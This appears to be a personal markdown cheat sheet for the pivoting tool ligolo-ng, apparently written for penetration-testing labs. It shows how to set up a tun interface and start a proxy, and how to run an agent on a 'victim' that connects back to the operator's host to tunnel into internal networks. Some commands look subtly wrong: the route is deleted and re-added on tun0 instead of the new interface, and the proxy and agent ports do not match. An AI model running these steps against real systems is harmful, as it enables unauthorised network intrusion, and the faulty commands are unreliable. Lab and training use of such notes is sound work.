---
title: "ligolo-ng"
tags:
  - fetus
---
## installation:
```sh
apt install ligolo-ng -y
```
## configuration to replace tun0 with ligolo tap adapter:
```sh
ip tuntap add user root mode tun ligolo
ip route del 10.200.180.0/24 dev tun0
ip link set ligolo up
ip route add 10.200.180.0/24 dev tun0
```
## usage:
- download the agent (and proxy if needed) binary from here after checking the victim architecture with `uname -m` from here: https://github.com/nicocha30/ligolo-ng/releases 
#### start proxy locally
```sh
ligolo-proxy -selfcert -laddr 0.0.0.0:8008
```
#### start agent on victim
- transfer the agent binary to the victim
```sh
./agent -connect 10.10.200.6:11601 -ignore-cert
```
- normally listens on `11601` 
- should get a connection back at the proxy
#### listener setup
```sh
listener_add --addr 192.168.98.15:4444 --to 10.10.200.6:4444
```
#### do these inside the proxy: 
```sh
session
tunnel_list 
start
```
